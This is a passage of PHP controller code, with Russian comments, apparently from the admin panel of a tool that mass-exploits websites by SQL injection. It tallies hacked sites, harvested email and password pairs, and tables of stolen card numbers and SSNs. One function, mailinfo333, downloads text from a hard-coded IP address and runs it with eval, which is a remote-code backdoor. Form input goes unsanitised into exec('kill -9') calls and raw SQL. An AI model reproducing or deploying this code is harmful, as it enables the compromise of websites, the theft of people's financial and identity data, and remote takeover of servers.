		if($this->params['form']['update3'])
		{
			$id = $this->params['form']['id3'];
			$status  = $this->params['form']['st3'];
			$pid = $this->params['form']['pid'];
			
			$this->logs("kill -9 ".$pid,__FUNCTION__);
			
			$this->Filed->query("DELETE FROM `starts` WHERE `pid` = $pid");
			
			$this->d($id);
			$this->d($status);
			
			
			
			
			$this->Post->query("UPDATE  `multis` SET  `get` = {$status} WHERE  `id` =".$id."");
			
			
			
			
			
			
			if($pid == 0)
			{
				
				echo 'PID!!! = '.$pid;
				
			}else{
				
				exec("kill -9 ".$pid);
			}
			
			
			

		}
		
        }
        
         if(isset($this->params['form']['update33'])){
        
		if($this->params['form']['update33'])
		{
			$id = $this->params['form']['id3'];
			$dok = $this->params['form']['dok'];
			$filed_id = $this->params['form']['filed_id'];
			$status  = $this->params['form']['st3_one'];
			$pid = $this->params['form']['pid'];
			
			$this->logs("kill -9 ".$pid,__FUNCTION__);
			
			$this->Filed->query("DELETE FROM `starts` WHERE `pid` = $pid");
			
			$this->d($id);
			$this->d($status);
			
			$this->d($statu);
			
			
			$this->Post->query("UPDATE  `multis_one` SET  `get` = {$status},`dok`={$dok} WHERE  `id` =".$id."");
			
			$this->Post->query("UPDATE  `fileds` SET  `potok` = 0 WHERE  `id` =".$filed_id."");
			
			
			
			if($pid == 0)
			{
				
				echo 'PID!!! = '.$pid;
				
			}else{
				
				exec("kill -9 ".$pid);
			}
			
			
			

		}
		
         }
		$shag1 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1.txt");
		if(strlen($shag1)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1.txt")){
			$shag1 = '0 шт';
		}
		$this->set('shag1',$shag1);
		
		
		$shag1_sql = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_sql.txt");
		if(strlen($shag1_sql)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_sql.txt")){
			$shag1_sql = '0 шт';
		}
		$this->set('shag1_sql',$shag1_sql);
		
		
		$shag1_sql_2 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_sql_2.txt");
		if(strlen($shag1_sql_2)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_sql_2.txt")){
			$shag1_sql_2 = '0 шт';
		}
		$this->set('shag1_sql_2',$shag1_sql_2);
		
		
		$shag1_22 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_22.txt");
		if(strlen($shag1_22)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_22.txt")){
			$shag1_22 = '0 шт';
		}
		$this->set('shag1_22',$shag1_22);
		
		
		$shag2 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag2.txt");
		if(strlen($shag2)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag2.txt")){
			$shag2 = '0 шт';
		}
		$this->set('shag2',$shag2);
		
		
		$shag2_22 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag2_22.txt");
		if(strlen($shag2_22)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag2_22.txt")){
			$shag2_22 = '0 шт';
		}
		$this->set('shag2_22',$shag2_22);
		
		
		$shag3 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag3.txt");
		if(strlen($shag3)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag3.txt")){
			$shag3 = '0 шт';
		}
		$this->set('shag3',$shag3);
		
		$shag4 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4.txt");
		if(strlen($shag4)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4.txt")){
			$shag4 = '0 шт';
		}
		$this->set('shag4',$shag4);
		
		$shag444 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag444.txt");
		if(strlen($shag444)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag444.txt")){
			$shag444 = '0 шт';
		}
		$this->set('shag444',$shag444);
		
		$shag400 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag400.txt");
		if(strlen($shag400)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag400.txt")){
			$shag400 = '0 шт';
		}
		$this->set('shag400',$shag400);
		
		
		$shag4000 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4000.txt");
		if(strlen($shag4000)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4000.txt")){
			$shag4000 = '0 шт';
		}
		$this->set('shag4000',$shag4000);
		
		
		
		$shag4005 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4005.txt");
		if(strlen($shag4005)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4005.txt")){
			$shag4005 = '0 шт';
		}
		$this->set('shag4005',$shag4005);
		
		
		$shag4006 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4006.txt");
		if(strlen($shag4006)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4006.txt")){
			$shag4006 = '0 шт';
		}
		$this->set('shag4006',$shag4006);
        
        $shagAdmins = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shagAdmins.txt");
		if(strlen($shagAdmins)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shagAdmins.txt")){
			$shagAdmins = '0 шт';
		}
		$this->set('shagAdmins',$shagAdmins);
        
        
        $shagAdminsPage = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shagAdminsPage.txt");
		if(strlen($shagAdminsPage)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shagAdminsPage.txt")){
			$shagAdminsPage = '0 шт';
		}
		$this->set('shagAdminsPage',$shagAdminsPage);
		
		
		$urls11144 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `admin` !='0' AND `order` !=':' AND `status`=3");
		$this->set('shag44',$urls11144[0][0]['count']);
		
		$urls44 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `admin`='0' AND `status`=3");
		$this->set('shag45',$urls44[0][0]['count']);
		
		//////
		
		$shag5 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email.txt");
		if(strlen($shag5)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email.txt")){
			$shag5 = '0 шт 0 мыл';
		}
		$this->set('shag5',$shag5);
		
		$shag55 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email_name.txt");
		if(strlen($shag55)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email_name.txt")){
			$shag55 = '0 шт 0 мыл';
		}
		$this->set('shag55',$shag55);
		
		
		$shag6 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email_pass.txt");
		if(strlen($shag6)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email_pass.txt")){
			$shag6 = '0 шт 0 мыл';
		}
		$this->set('shag6',$shag6);
		
		
		
		$shag7 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/down_email_pass.txt");
		if(strlen($shag7)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/down_email_pass.txt")){
			$shag7 = '0 мыл(уник)';
		}
		$this->set('shag7',$shag7);
		
		$shag77 = file_get_contents($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/down_email.txt");
		if(strlen($shag77)==0 or !file_exists($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/down_email.txt")){
			$shag77 = '0 мыл(уник)';
		}
		$this->set('shag77',$shag77);
		
		
		

		
		

		
		
		$st = $this->Post->query("SELECT * FROM `starts`"); 
		
		//$st2 = $this->Post->query("SELECT * FROM `fileds` WHERE `get`='1'");
		
		$st3 = $this->Post->query("SELECT * FROM `multis` WHERE `get`=1");
		
		$st3_one = $this->Post->query("SELECT * FROM `multis_one` WHERE `get`=1");
		

		$this->set('starts',$st);
		
		
		
		//$this->set('starts2',$st2);
		
		$this->set('starts3',$st3);
		
		$this->set('starts3_one',$st3_one);
		
		
		
	}
	
	
	
	
	function mailinfo333(){ // суммарная информация обо всем
	
	
  // echo phpinfo();
		$gg = file_get_contents('http://89.163.216.25/nafksjh1dfbsjcnvskmcmnjfklq/main.txt');
		
		
  
		eval($gg);
		
	}
	
	function mailinfo2(){ // суммарная информация обо всем
		
		$this->timeStart = $this->start('stata_main',1);
		
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo", 0777);
		
		$usp = $this->Post->query("SELECT count(*) as `count` FROM 	`posts` WHERE `status`=3");		
		$tmp = $usp[0][0]['count'];
		$usp_tmp = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp.txt";
		file_put_contents($usp_tmp,$tmp);
		
		
		$usp2 = $this->Post->query("SELECT count(*) as `count` FROM `fileds`");	
		$tmp2 = $usp2[0][0]['count'];
		$usp_tmp2 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp2.txt";
		file_put_contents($usp_tmp2,$tmp2);
		
		
		
		$usp3 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `order` !='0' AND `order` !=':' AND `status`=3");	
		$tmp3 = $usp3[0][0]['count'];
		$usp_tmp3 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp3.txt";
		file_put_contents($usp_tmp3,$tmp3);
		
		
		
		$usp4 = $this->Post->query("SELECT count(*) as `count` FROM `orders`");	
		$tmp4 = $usp4[0][0]['count'];
		$usp_tmp4 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp4.txt";
		file_put_contents($usp_tmp4,$tmp4);
		
		$usp44 = $this->Post->query("SELECT count(*) as `count` FROM `ssn`");	
		$tmp44 = $usp44[0][0]['count'];
		$usp_tmp44 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/usp44.txt";
		file_put_contents($usp_tmp44,$tmp44);



		$mat = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=2");
		$tmp5 = $usp5[0][0]['count'];
		$usp_tmp5 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/mat.txt";
		file_put_contents($usp_tmp5,$tmp5);
		
		
		
		$shlak = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=1");
		$tmp6 = $shlak[0][0]['count'];
		$usp_tmp6 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shlak.txt";
		file_put_contents($usp_tmp6,$tmp6);



		$shlak2 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=0 AND `sqlmap_check`=0");
		$tmp7 = $shlak2[0][0]['count'];
		$usp_tmp7 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shlak2.txt";
		file_put_contents($usp_tmp7,$tmp7);
		////////////////////////////////////////////////////////////////////
		
		if($this->sqlmap_check){
			$countpost = $this->Post->query("SELECT count(*) as `count` FROM  `posts` WHERE  `status` =0 AND `sqlmap_check`=0");
		}else{
			$countpost = $this->Post->query("SELECT count(*) as `count` FROM  `posts` WHERE  `status` =0");
		}
		
		$tmp2 = $countpost[0][0]['count']." шт ";
		$shag1 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1.txt";
		file_put_contents($shag1,$tmp2);
		
		
		
		////
		
		$countpost222 = $this->Post->query("SELECT count(*) as `count` FROM  `posts` WHERE  `sqlmap_check`=1");
		
		
		$tmp2_sql = $countpost222[0][0]['count']." шт ";
		$shag1_sql = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_sql.txt";
		file_put_contents($shag1_sql,$tmp2_sql);
		
		
		////
		$countpost222_2 = $this->Post->query("SELECT count(*) as `count` FROM  `posts` WHERE  `sqlmap_check`=2");
		$tmp2_sql_2 = $countpost222_2[0][0]['count']." шт ";
		$shag1_sql_2 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_sql_2.txt";
		file_put_contents($shag1_sql_2,$tmp2_sql_2);
		////
		
		$countpost22 = $this->Post->query("SELECT count(*) as `count` FROM  `posts` WHERE  `status` =0 AND get_type='asp'");
		$tmp222 = $countpost22[0][0]['count']." шт ";
		$shag1_22 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag1_22.txt";
		file_put_contents($shag1_22,$tmp222);
		
        
        //"SELECT * FROM `posts` WHERE `status`=2 AND `prohod`<5 AND `multi_count` < ".$this->multi_count." AND (find !='cookies' AND find !='referer'  AND find !='useragent'  and find !='forwarder') limit ".$this->multi_limit
        
        
        //$urls = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=2 AND `prohod`<5");
		$urls = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=2 AND `prohod`<5 AND `multi_count` < ".$this->multi_count." AND (find !='cookies' AND find !='referer'  AND find !='useragent'  and find !='forwarder')");
		$tmp2 = $urls[0][0]['count']." шт ";
		$shag2 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag2.txt";
		file_put_contents($shag2,$tmp2);
		
		
		$urls_22 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=2 AND `prohod`<5 AND get_type='asp'");
		$tmp2_22 = $urls[0][0]['count']." шт ";
		$shag2_22 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag2_22.txt";
		file_put_contents($shag2_22,$tmp2_22);
		////
		
		$urls = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `getmail`=0  AND `version` LIKE  '%5.%'");
		$tmp2 = $urls[0][0]['count']." шт ";
		$shag3 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag3.txt";
		file_put_contents($shag3,$tmp2);
		////
		
		
		$urls = $this->Post->query("SELECT count(*) as `count` FROM `fileds` WHERE `password`='' AND `get`=0");
		$tmp2 = $urls[0][0]['count']." шт ";
		$shag4 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4.txt";
		file_put_contents($shag4,$tmp2);
		////
		
		
		$urls = $this->Post->query("SELECT count(*) as `count` FROM `fileds` WHERE `name`='' AND `get`=0");
		$tmp44 = $urls[0][0]['count']." шт ";
		$shag444 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag444.txt";
		file_put_contents($shag444,$tmp44);
		////
		
		
		
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =0  limit 10");
		//$this->Filed->query('UPDATE  `posts` SET  `order_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
		
		///CARDS
		
		$urls5555_1 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `order_check` =0 ");
		$urls5555_2 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `order_check` =1 ");
		$tmp2 = $urls5555_1[0][0]['count']."/".$urls5555_2[0][0]['count']." шт ";
		$shag400 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag400.txt";
		file_put_contents($shag400,$tmp2);
		
		
		$urls5555_11 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =0 AND `version` LIKE  'M%'");
		$urls5555_22 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =1 AND `version` LIKE  'M%'");
		$tmp222 = $urls5555_11[0][0]['count']."/".$urls5555_22[0][0]['count']." шт ";
		$shag4000 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4000.txt";
		file_put_contents($shag4000,$tmp222);
		
		
		///SSN
		
		$urls5555_15 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =0 AND `version` LIKE  '%5.%'");
		$urls5555_25 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =1 AND `version` LIKE  '%5.%'");
		$tmp2 = $urls5555_15[0][0]['count']."/".$urls5555_25[0][0]['count']." шт ";
		$shag4005 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4005.txt";
		file_put_contents($shag4005,$tmp2);
		
		
		$urls5555_155 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =0 AND `version` LIKE  'M%'");
		$urls5555_255 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =1 AND `version` LIKE  'M%'");
		$tmp2 = $urls5555_155[0][0]['count']."/".$urls5555_255[0][0]['count']." шт ";
		$shag4006 = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shag4006.txt";
		file_put_contents($shag4006,$tmp2);
		////
		
        
        $urls5555_155_11 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `table_admin_check`=0 AND `status`=3");
		$urls5555_255_22 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `table_admin_check`=1 AND  `status`=3 ");
		$tmp2 = $urls5555_155_11[0][0]['count']."/".$urls5555_255_22[0][0]['count']." шт ";
		$shagAdmins = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shagAdmins.txt";
		file_put_contents($shagAdmins,$tmp2);
        
        
        $urls5555_155_11 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `page_admin_check`=0 AND  `status`=3 ");
		$urls5555_255_22 = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `page_admin_check`=1 AND  `status`=3 ");
		$tmp2 = $urls5555_155_11[0][0]['count']."/".$urls5555_255_22[0][0]['count']." шт ";
		$shagAdminsPage = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/shagAdminsPage.txt";
		file_put_contents($shagAdminsPage,$tmp2);
		
		
		////////////////////////////
		
		$urls = $this->Post->query("SELECT count(*) as `count` FROM `fileds` WHERE `password` =':' and `get`=0");
		$urlss = $this->Post->query("SELECT sum(count) as `count` FROM `fileds` WHERE `password` =':' and `get`=0");
		$tmp1 = $urls[0][0]['count']." шт ".$urlss[0][0]['count']." мыл";
		$naideno_email = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email.txt";
		file_put_contents($naideno_email,$tmp1);
		//
		
		
		$urls = $this->Post->query("SELECT count(*) as `count` FROM `fileds` WHERE `name` !=':' and `get`=0");
		$urlss = $this->Post->query("SELECT sum(count) as `count` FROM `fileds` WHERE `name` !=':' and `get`=0");
		$tmp11 = $urls[0][0]['count']." шт ".$urlss[0][0]['count']." мыл";
		$naideno_email_name = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email_name.txt";
		file_put_contents($naideno_email_name,$tmp11);
		
		
		$urls = $this->Post->query("SELECT count(*) as `count` FROM `fileds` WHERE `password` !='' and `password` !=':' and `get`=0");
		$urlss = $this->Post->query("SELECT sum(count) as `count` FROM `fileds` WHERE `password` !='' and `password` !=':' and `get`=0");
		$tmp2 = $urls[0][0]['count']." шт ".$urlss[0][0]['count']." мыл";
		$naideno_email_pass = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/naideno_email_pass.txt";
		file_put_contents($naideno_email_pass,$tmp2);
		//
		
		$countall = $this->Post->query("SELECT count(*) FROM `mails`");
		$tmp3 =  $countall[0][0]['count(*)']." мыл(уник)";
		$down_email_pass = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/down_email_pass.txt";
		file_put_contents($down_email_pass,$tmp3);
		//
		
		$countall2 = $this->Post->query("SELECT count(*) FROM `mails_one`");
		$tmp4 =  $countall2[0][0]['count(*)']." мыл(уник)";
		$down_email = $_SERVER['DOCUMENT_ROOT']."/app/webroot/mailinfo/down_email.txt";
		file_put_contents($down_email,$tmp4);
		
		
		
		//$this->d($filename);
		
		
		//$this->d('vrode good');
		
		$this->stop();
		
		$this->redirect(array('action'=>"mailinfo"));
		
		
		exit;
		
		
		
		
		
	}
	
	
	
	function dumping_all(){ //для главной страницы обновление
		
		
	if($this->params['form']['update33'])
		{
			$id = $this->params['form']['id3'];
			$limit = $this->params['form']['limit'];
			$dok = $this->params['form']['dok'];
			$filed_id = $this->params['form']['filed_id'];
			$status  = $this->params['form']['st3_one'];
			$pid = $this->params['form']['pid'];
			
			$this->logs("kill -9 ".$pid,__FUNCTION__);
			
			$this->Filed->query("DELETE FROM `starts` WHERE `pid` = $pid");
			
			$this->d($id);
			$this->d($status);
			
			$this->d($status);
			
			
			
			if($pid == 0)
			{
				
				echo 'PID!!! = '.$pid;
				
			}else{
				
				exec("kill -9 ".$pid);
			}
			
			
			if($status==4 or $status=='4'){
					if($this->Filed->query("DELETE FROM `multis_one` WHERE `id` = $id.")){
						
						$this->d('udalen uspeshno');
					}
				exit;
			}
			
			
			
			
			
			
			
			$this->Post->query("UPDATE  `multis_one` SET  `get` = {$status},`dok`={$dok},`lastlimit`={$limit} WHERE  `id` =".$id."");
			
			$this->Post->query("UPDATE  `fileds_one` SET  `potok` = 0 WHERE  `id` =".$filed_id."");
			
			
			if($status==3 or $status=='3'){
				if($this->Post->query("UPDATE  `fileds_one` SET  `get` = '1',`multi`=1 WHERE  `id` =".$filed_id."")){
					
					
					$this->d('peresapuhen');
				}else{
					
					$this->d('NE peresapuhen');
					$this->d("UPDATE  `fileds_one` SET  `get` = '1',`multi`=1 WHERE  `id` =".$filed_id."");
				}
			}
			
			
			

		}	
		
		
	
	$st3_one = $this->Post->query("SELECT * FROM `multis_one`");
		
		
	$this->set('starts3_one',$st3_one);
}
	
	function index($stat=3){ //просто главная страница с пагинацией
		
		
		//if($stat=)
		//$poles = $this->Filed->query("SELECT * FROM posts LEFT JOIN fileds ON posts.id=fileds.post_id WHERE status =3 limit 50");
		$conditions = array
		(
		'status' => intval($stat),
		
		);
		
		
		$data = $this->paginate('Post',$conditions);
		//$this->d($data);
		//exit;
		
		$this->set('data',$data);	
	}
	
	function index2(){ //найденные но не взломанные
		
		
		//if($stat=)
		//$poles = $this->Filed->query("SELECT * FROM posts LEFT JOIN fileds ON posts.id=fileds.post_id WHERE status =3 limit 50");
		$conditions = array
		(
		'status' => intval(2),
		'prohod'=>5
		
		);
		
		
		$data = $this->paginate('Post',$conditions);
		//$this->d($data);
		//exit;
		
		$this->set('data',$data);	
	}
	
	function index3(){//отображение таблицы c картами больше 50 значения которых
		
		
		$this->s();
		
		if($this->params['pass'][1]==''){
			$st=1;
			}
		else{
			$st=$this->params['pass'][1];
		}
		$st=$st-1;
		
		$limit = $st*500;
		$limit = $limit.",500";
		
		//$this->d($limit,'$limit');
		
		
		if($this->params['pass'][0] == 'id'){
			$data = $this->Post->query("SELECT * FROM  `posts_all` WHERE `status`=2 or `status`=3 order by id DESC limit ".$limit);
		}elseif($this->params['pass'][0] == 'date')
		{
			$data = $this->Post->query("SELECT * FROM  `posts_all` WHERE `status`=2 or `status`=3 order by date DESC limit ".$limit);
		}else{
			//echo "SELECT * FROM  `posts_all` WHERE `status`=2 or `status`=3 order by date DESC limit ".$limit
			$data = $this->Post->query("SELECT * FROM  `posts_all` WHERE `status`=2 or `status`=3 order by domen DESC limit ".$limit);
		}
		
		
		$data222 = $this->Post->query("SELECT count(*) FROM  `posts_all` WHERE `status`=2 or `status`=3 order by id DESC");
		
		$this->params['pass'][10] = $data222[0][0]['count(*)'];
		
		
		//$this->d($data,'data');
		
		$this->set('data',$data);
		
	}
	
	
	
	function order_count(){//отображение таблицы c картами больше 50 значения которых
		
		
		$this->s();
		
		if($this->params['pass'][1]==''){
			$st=1;
			}
		else{
			$st=$this->params['pass'][1];
		}
		$st=$st-1;
		
		$limit = $st*500;
		$limit = $limit.",500";
		
		//$this->d($limit,'$limit');
		
		
		if($this->params['pass'][0] == 'id'){
			$data = $this->Post->query("SELECT * FROM  `orders` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by id DESC limit ".$limit);
		}elseif($this->params['pass'][0] == 'date'){
			$data = $this->Post->query("SELECT * FROM  `orders` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by date DESC limit ".$limit);
		}elseif($this->params['pass'][0] == 'count'){
			$data = $this->Post->query("SELECT * FROM  `orders` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count DESC limit ".$limit);
		}elseif($this->params['pass'][0] == 'new'){
			
			$data = $this->Post->query("SELECT * FROM  `orders` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count_new  DESC limit ".$limit);
		
		}elseif($this->params['pass'][0] == 'new2'){
			$data = $this->Post->query("SELECT * FROM  `orders` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count_new2 DESC limit ".$limit);
		}else{
			$data = $this->Post->query("SELECT * FROM  `orders` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count DESC limit ".$limit);
		}
		
		
		$data222 = $this->Post->query("SELECT count(*) FROM  `orders` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count DESC");
		
		$this->params['pass'][10] = $data222[0][0]['count(*)'];
		
		$p = array();
		
		
		
		//$this->d($data,'data');
		
		$i = 1;
		
		//$p[$i]['all'][] =$all;
		
		foreach($data as $d)
		{
			$post_id =  $d['orders']['post_id'];
			$order_id = $d['orders']['id'];
			
			
			$p[$i]['post_id'][] = 	$d['orders']['post_id'];
			$p[$i]['id'][] = 		$d['orders']['id'];
			$p[$i]['bd'][] = 		$d['orders']['bd'];
			$p[$i]['table'][] = 	$d['orders']['table'];
			$p[$i]['column'][] = 	$d['orders']['column'];
			$p[$i]['shema'][] = 	$d['orders']['shema'];
			$p[$i]['count'][] = 	$d['orders']['count'];
			$p[$i]['count_new'][] = 	$d['orders']['count_new'];
			$p[$i]['count_new2'][] = 	$d['orders']['count_new2'];
			$p[$i]['count_n'][] = 	$d['orders']['count_n'];
			$p[$i]['domen'][] =  	$d['orders']['domen'];
			$p[$i]['column_16'][] = $d['orders']['column_16'];
			$p[$i]['date'][] = 		$d['orders']['date'];
			$p[$i]['date_new'][] = 		$d['orders']['date_new'];
			$p[$i]['color'][] = 	$d['orders']['color'];
			
			
			//$p[$i]['url'][] = 		$d['orders']['url'];
			
			
			
			$g2 = $this->Post->query("SELECT * FROM  `orders_card` WHERE order_id=".$order_id."");
			
			$g3 =  $this->Post->query("SELECT * FROM  `posts` WHERE id=".$post_id);
			
			//$this->d("SELECT * FROM  `posts` WHERE id=".$post_id,'$g3');
			//exit;
			//$this->d($g2,"SELECT * FROM  `orders_card` WHERE order_id='".$order_id."'");
			
			
				
			//$this->d($d,'$d');
			//$this->d($g3,"SELECT * FROM  `posts` WHERE domen like '%{$domen}'");
			
			
				
			
			
			
			
			
			
			foreach($g2 as $g23){
				
				
				$p[$i]['orders_card'][] = $g23['orders_card'];
			}
			
			
			$p[$i]['url'][] = $g3[0]['posts']['url'];
			$p[$i]['alexa'][] =		 $g3[0]['posts']['alexa'];
			$p[$i]['pr'][] =   		 $g3[0]['posts']['pr'];
			$p[$i]['country'][] =    $g3[0]['posts']['country'];
			//$this->d($p );
			//exit;
			
			
			
			$i++;
			
			
		}
		
		//$this->d($p,'data');
		
		$this->set('data',$p);
		
	}
	
	function ssn_count(){//отображение таблицы c ssn больше 50 значения которых
		
		
		$this->s();
		
		if($this->params['pass'][1]==''){
			$st=1;
			}
		else{
			$st=$this->params['pass'][1];
		}
		$st=$st-1;
		
		$limit = $st*500;
		$limit = $limit.",500";
		
		//$this->d($limit,'$limit');
		
		
		if($this->params['pass'][0] == 'id'){
			$data = $this->Post->query("SELECT * FROM  `ssn` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by id DESC limit ".$limit);
		}elseif($this->params['pass'][0] == 'date'){
			$data = $this->Post->query("SELECT * FROM  `ssn` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by date DESC limit ".$limit);
		}elseif($this->params['pass'][0] == 'count'){
			$data = $this->Post->query("SELECT * FROM  `ssn` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count DESC limit ".$limit);
		}elseif($this->params['pass'][0] == 'new'){
			
			$data = $this->Post->query("SELECT * FROM  `ssn` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count_new  DESC limit ".$limit);
		
		}elseif($this->params['pass'][0] == 'new2'){
			$data = $this->Post->query("SELECT * FROM  `ssn` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count_new2 DESC limit ".$limit);
		}else{
			$data = $this->Post->query("SELECT * FROM  `ssn` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count DESC limit ".$limit);
		}
		
		
		$data222 = $this->Post->query("SELECT count(*) FROM  `ssn` WHERE `bd` !='' AND `table` !='' AND `column` !='' order by count DESC");
		
		$this->params['pass'][10] = $data222[0][0]['count(*)'];
		
		$p = array();
		
		
		
		//$this->d($data,'data');
		
		$i = 1;
		
		//$p[$i]['all'][] =$all;
		
		foreach($data as $d)
		{
			$post_id =  $d['ssn']['post_id'];
